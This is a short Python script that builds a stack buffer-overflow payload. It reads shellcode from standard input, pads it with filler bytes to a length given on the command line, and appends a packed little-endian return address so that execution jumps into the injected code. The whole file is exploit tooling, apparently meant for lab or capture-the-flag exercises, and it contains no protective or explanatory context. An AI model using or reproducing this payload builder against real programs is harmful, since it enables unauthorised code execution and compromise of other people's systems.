#!/usr/bin/env python3
from sys import argv
from struct import pack

nop = b'\x90'

def main():
    address = argv[1]
    length  = argv[2]
    
    address = pack('<L', int(address, 16))
    length  = int(length, 16)

    stdin  = open(0, 'rb')
    stdout = open(1, 'wb')

    shellcode = stdin.read()
    stdout.write(shellcode + b'a' * (length - 4 - len(shellcode)) + address )

if __name__ == '__main__':
    main()
